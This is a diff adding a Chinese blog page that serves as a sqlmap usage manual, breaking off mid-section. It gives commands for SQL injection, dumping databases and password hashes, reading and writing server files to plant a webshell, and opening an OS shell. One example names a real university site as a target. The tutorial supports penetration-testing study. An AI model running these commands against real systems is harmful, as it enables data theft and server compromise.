@@ -1,0 +1,1106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一直没有找到关于sqlmap注入非常详细的知识点总结，最近在乌云里面发现一篇很好的文章关于sqlmap使用的方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap使用手册">
+<meta property="og:url" content="https://npfs06.top/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/index.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="一直没有找到关于sqlmap注入非常详细的知识点总结，最近在乌云里面发现一篇很好的文章关于sqlmap使用的方法">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.npfs06.top/20210326210404.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210326210431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210326210503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210326210523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="article:published_time" content="2020-11-23T11:40:29.000Z">
+<meta property="article:modified_time" content="2020-11-23T11:40:29.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.npfs06.top/20210326210404.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+
+<link rel="canonical" href="https://npfs06.top/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sqlmap使用手册 | 安小琪's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://npfs06.top/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="安小琪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安小琪's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap使用手册
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-23 19:40:29" itemprop="dateCreated datePublished" datetime="2020-11-23T19:40:29+08:00">2020-11-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/share/" itemprop="url" rel="index"><span itemprop="name">share</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一直没有找到关于sqlmap注入非常详细的知识点总结，最近在乌云里面发现一篇很好的文章关于sqlmap使用的方法<a id="more"></a></p>
+<p>就搬运过来了，再加上一些其它文章的内容，总结而得到的本文。</p>
+<h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p><strong>GET方式</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="regexp">//</span>这个URL必须含？</span><br></pre></td></tr></table></figure>
+<p><strong>POST方式</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span>testasp.vulnweb.com/Login.asp --data <span class="string">&quot;tfUName=1&amp;tfUPass=1&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>cookie注入</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--cookie</span> <span class="string">&quot;chsadj&quot;</span> <span class="params">--level</span> 2 <span class="string">//</span>这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面</span><br></pre></td></tr></table></figure>
+<p><strong>tamper方式</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> -v 3 <span class="params">--batch</span> <span class="params">--tamper</span> <span class="string">&quot;sac.py&quot;</span>  <span class="string">//temper</span>后面的插件可以去sql安装目录查找</span><br></pre></td></tr></table></figure>
+<p><strong>自动检测表</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span>testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure>
+<p><strong>延时两秒</strong></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap –u “url” <span class="comment">--delay 2</span></span><br></pre></td></tr></table></figure>
+<p><strong>频率3次</strong></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap –u “url” <span class="comment">--safe-freq 3</span></span><br></pre></td></tr></table></figure>
+<p><strong>伪静态</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap -u http:<span class="regexp">//</span>sfl.fzu.edu.cn<span class="regexp">/index.php/</span>Index<span class="regexp">/view/i</span>d<span class="regexp">/40.html /</span><span class="regexp">/在40后面加*</span></span><br></pre></td></tr></table></figure>
+<h1 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dbs   <span class="regexp">//</span>查看所有数据库</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --users <span class="regexp">//</span>查看所有用户</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --current-db <span class="regexp">//</span>查看当前的数据库</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --current-user <span class="regexp">//</span>产看当前的用户</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --is-dba <span class="regexp">//</span>查看是否是最高权限</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --passwords <span class="regexp">//</span>查看所有密码</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –hostname <span class="regexp">//</span>查看主机名</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> privileges -U username <span class="regexp">//</span>查看用户权限</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –roles <span class="regexp">//</span>查看用户角色</span><br></pre></td></tr></table></figure>
+<p><strong>查看详细内容</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --tables -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>database这个数据库的表数据表</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --columns -T <span class="string">&quot;tables&quot;</span> -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>查看tables这个数据表的字段</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --dump <span class="string">&quot;a,b,c&quot;</span> -C <span class="string">&quot;columns&quot;</span> -T <span class="string">&quot;tables&quot;</span> -D <span class="string">&quot;database&quot;</span> <span class="regexp">//</span>下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有</span><br></pre></td></tr></table></figure>
+<h1 id="执行特殊操作"><a href="#执行特殊操作" class="headerlink" title="执行特殊操作"></a>执行特殊操作</h1><p><strong>文件查看</strong></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> –<span class="keyword">file</span>-<span class="keyword">read</span>= <span class="comment">//这个读取的文件会存在本地的结果目录，请认真看提示</span></span><br></pre></td></tr></table></figure>
+<p><strong>文件写入</strong></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --<span class="keyword">file</span>-<span class="keyword">write</span>=本地文件路径 --<span class="keyword">file</span>-dest=网站的绝对路径 <span class="comment">//上传webshell用，需要dba权限</span></span><br></pre></td></tr></table></figure>
+<p><strong>命令执行</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--os-cmd</span> <span class="string">&quot;cmd&quot;</span>  <span class="string">//</span>执行cmd代表的命令，如<span class="keyword">cd</span> C:/</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> <span class="params">--os-shell</span>  <span class="string">//</span>进入数据库自带的shell</span><br></pre></td></tr></table></figure>
+<h1 id="命令总览"><a href="#命令总览" class="headerlink" title="命令总览"></a>命令总览</h1><p>使用<code>sqlmap -hh</code>可以查看详细的命令说明：</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">r <span class="number">1</span>.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行</span></span><br><span class="line"><span class="ruby">-l log.txt          可以将代理的日志作为目标去检测[见下图]</span></span><br><span class="line"><span class="ruby">-m <span class="number">1</span>.txt            对于多个URL，可以一排一个写入文件后加载</span></span><br><span class="line"><span class="ruby">--force-ssl         对于使用SSL的URL要在后面加上这个参数</span></span><br><span class="line"><span class="ruby">--data              对于使用post方法，可以将参数写在data后面</span></span><br><span class="line"><span class="ruby">--param-del=<span class="string">&quot;&quot;</span>          </span></span><br><span class="line"><span class="ruby">--cookie=<span class="string">&quot;&quot;</span>  level <span class="number">2</span>        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于<span class="number">1</span></span></span><br><span class="line"><span class="ruby">--random-agent          使用随机的user-agent</span></span><br><span class="line"><span class="ruby">--user-agent=<span class="string">&quot;&quot;</span>  level <span class="number">3</span>    指定user-agent，如要检测它是否有漏洞level要高于<span class="number">2</span></span></span><br><span class="line"><span class="ruby">--header=<span class="string">&quot;\n&quot;</span>           指定头信息，如User-<span class="symbol">Agent:</span>dsacs，大小写敏感，多个用\n分隔</span></span><br><span class="line"><span class="ruby">--method=GET POST       设置提交方式，默认一个一个的尝试</span></span><br><span class="line"><span class="ruby">--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用</span></span><br><span class="line"><span class="ruby">--auth-cred <span class="string">&quot;user:pass&quot;</span>     填写账号和密码</span></span><br><span class="line"><span class="ruby"> --proxy=<span class="string">&quot;http:127.0.0.1:8087&quot;</span>  使用代理</span></span><br><span class="line"><span class="ruby">--proxy-cred=<span class="string">&quot;name:pass&quot;</span>    如果代理要密码的话</span></span><br><span class="line"><span class="ruby">--ignore-proxy          强制不使用代理</span></span><br><span class="line"><span class="ruby">--delay             请求延迟间隔，单位秒，默认无延迟</span></span><br><span class="line"><span class="ruby">--retries           链接失败重试次数<span class="number">3</span></span></span><br><span class="line"><span class="ruby">--timeout           链接超时时间<span class="number">30</span></span></span><br><span class="line"><span class="ruby">--randomize=<span class="string">&quot;param&quot;</span>     使用和源参数类型长度一致的参数</span></span><br><span class="line"><span class="ruby">sqlmap -l l.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span>     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名</span></span><br><span class="line"><span class="ruby">sqlmap -l <span class="number">2</span>.log --scope=<span class="string">&quot;(19)?\.168\.20\.(1|11|111)&quot;</span>        同上，筛选<span class="number">19</span>*.<span class="number">168.20</span>.<span class="number">1</span>/<span class="number">11</span>/<span class="number">111</span>这几个网段的IP</span></span><br><span class="line"><span class="ruby">--safe-url=<span class="string">&quot;url&quot;</span>        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生</span></span><br><span class="line"><span class="ruby">--safe-freq <span class="number">10</span>          尝试的与正确的URL的交换频率</span></span><br><span class="line"><span class="ruby">--skip-urlencode        有的URL在get方式提交时没编码，就要用这个</span></span><br><span class="line"><span class="ruby">--eval=<span class="string">&quot;&quot;</span>php代码      这个后面可以跟PHP代码，能够执行</span></span><br><span class="line"><span class="ruby">--keep-alive            保持连接会降低资源使用，但是不能与代理兼容</span></span><br><span class="line"><span class="ruby">--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容</span></span><br><span class="line"><span class="ruby">--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容</span></span><br><span class="line"><span class="ruby">--threads           最大并发数，默认<span class="number">1</span>，最大不要超过<span class="number">10</span>，盲注时一次返回一个字符【<span class="number">7</span>次请求】</span></span><br><span class="line"><span class="ruby">-o              使用除了--threads的全部的优化参数</span></span><br><span class="line"><span class="ruby">-p              指定参数，使level失效</span></span><br><span class="line"><span class="ruby">-skip               排除不扫描的参数</span></span><br><span class="line"><span class="ruby">                对于伪静态网页，就在参数后面加*</span></span><br><span class="line"><span class="ruby">--dbms              接数据库管理系统，如MySQL</span></span><br><span class="line"><span class="ruby">--os                接系统，如Linux</span></span><br><span class="line"><span class="ruby">--invalid-bignum        使用大数作为假的值</span></span><br><span class="line"><span class="ruby">--invalid-logical       使用逻辑数作为假的值</span></span><br><span class="line"><span class="ruby">--no-cat            对于接收到的null不自动转换成空格</span></span><br><span class="line"><span class="ruby">--no-escape         不使用逃逸，就是不把<span class="string">&#x27;转换成asii码形式</span></span></span><br><span class="line"><span class="ruby">--prefix            在参数前指定前缀</span></span><br><span class="line"><span class="ruby">--suffix            在参数后指定后缀</span></span><br><span class="line"><span class="ruby">--level             设置检查的等级，默认为<span class="number">1</span>，共<span class="number">5</span>个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息</span></span><br><span class="line"><span class="ruby">--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容</span></span><br><span class="line"><span class="ruby">--string            当页面含有这个字符串时为真</span></span><br><span class="line"><span class="ruby">--<span class="keyword">not</span>-string            当页面不含这个字符串时为真</span></span><br><span class="line"><span class="ruby">--regexp            用正则表达式判断</span></span><br><span class="line"><span class="ruby">--code              当状态代码为*时为真</span></span><br><span class="line"><span class="ruby">--text-only         页面含有*时为真</span></span><br><span class="line"><span class="ruby">--titles            页面标题为*时为真</span></span><br><span class="line"><span class="ruby">--techniques </span></span><br><span class="line"><span class="ruby">B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询</span></span><br><span class="line"><span class="ruby">--time-sec          </span></span><br><span class="line"><span class="ruby">--union-cols            联合查询第几列到第几列</span></span><br><span class="line"><span class="ruby">--union-char            用select null,<span class="number">1</span><span class="symbol">:</span><span class="number">2</span>  这种，可能会出错，就讲这个null换成其他数字占位</span></span><br><span class="line"><span class="ruby">--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方</span></span><br><span class="line"><span class="ruby">-fingerprint            指纹信息</span></span><br><span class="line"><span class="ruby">--banner            版本信息</span></span><br><span class="line"><span class="ruby">--batch             按照软件默认设置，自动回答</span></span><br><span class="line"><span class="ruby">--count             计数</span></span><br><span class="line"><span class="ruby">-s              将这个会话保存下次继续</span></span><br><span class="line"><span class="ruby">-t              将这些数据保存</span></span><br><span class="line"><span class="ruby">--charset           强制设置数据库编码</span></span><br><span class="line"><span class="ruby">--crawl             设置蜘蛛爬行的深度</span></span><br><span class="line"><span class="ruby">--csv-del           设置下载的数据的分隔方式，默认是,</span></span><br><span class="line"><span class="ruby">--dbms-cred         设置数据库用户</span></span><br><span class="line"><span class="ruby">--flush-session         清空以前的会话数据</span></span><br><span class="line"><span class="ruby">--fresh-queries         不清空会话，重新查询</span></span><br><span class="line"><span class="ruby">--hex               一<span class="number">16</span>进制编码的方式传输数据</span></span><br><span class="line"><span class="ruby">--output-dir            会话输出文件夹</span></span><br><span class="line"><span class="ruby">--parse-errors          显示MySQL错误信息</span></span><br><span class="line"><span class="ruby">--save              保存当前配置为文件</span></span><br><span class="line"><span class="ruby">-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.</span></span><br><span class="line"><span class="ruby">--answers           这个可以对一些特定的问题作出回答，在自动化注入中用</span></span><br><span class="line"><span class="ruby">--check-waf         检查是否含有waf等</span></span><br><span class="line"><span class="ruby">--identify-waf          彻底的检查waf等的信息</span></span><br><span class="line"><span class="ruby">--smart     当有大量目标时，这个就只检查基于错误的注入点</span></span><br><span class="line"><span class="ruby">--mobile    模拟智能手机去扫描</span></span><br><span class="line"><span class="ruby">--wizard    向导模式</span></span><br><span class="line"><span class="ruby">--purge-out 清除输出内容</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>-l</code>参数时，这样设置<code>burpsuite</code>：</p>
+<p><img src="https://img.npfs06.top/20210326210404.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h1 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h1><p>当给<code>sqlmap</code>这么一个<code>url</code>的时候，它会：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 判断可注入的参数</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 判断可以用那种SQL注入技术来注入</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 识别出哪种数据库</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 根据用户选择，读取哪些数据</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap</code>支持五种不同的注入模式：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 基于布尔的盲注，即可以根据返回页面判断条件（真\|假）的注入。</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> 联合查询注入，可以使用union的情况下的注入。</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> 堆查询注入，可以同时执行多条语句的执行时的注入。（使用;分隔开多条语句，最为灵活，可以自己构造select（含）外的其他语句）</span><br></pre></td></tr></table></figure>
+<p><code>sqlmap</code>支持的数据库管理系统有：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL, Oracle, PostgreSQL, Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span>, Microsoft <span class="keyword">Access</span>, IBM DB2,</span><br><span class="line">SQLite, Firebird, Sybase和SAP MaxDB</span><br></pre></td></tr></table></figure>
+<p>可以提供一个简单的<code>URL，Burp</code>或<code>WebScarab</code>请求日志文件，文本文档中的完整<code>http</code>请求或者<code>Google</code>的搜索，匹配出结果页面，</p>
+<p>也可以自己定义一个正则来判断那个地址去测试。</p>
+<p>测试<code>GET</code>参数，<code>POST</code>参数，<code>HTTP Cookie</code>参数，<code>HTTP User-Agent</code>头和<code>HTTP Referer</code>头来确认是否有<code>SQL</code>注入，</p>
+<p>它也可以指定用逗号分隔的列表的具体参数来测试。可以设定<code>HTTP(S)</code>请求的并发数，来提高盲注时的效率。</p>
+<h1 id="用来连接数据库"><a href="#用来连接数据库" class="headerlink" title="用来连接数据库"></a>用来连接数据库</h1><p>这是一个比较实用的功能，用来连接数据库格式为</p>
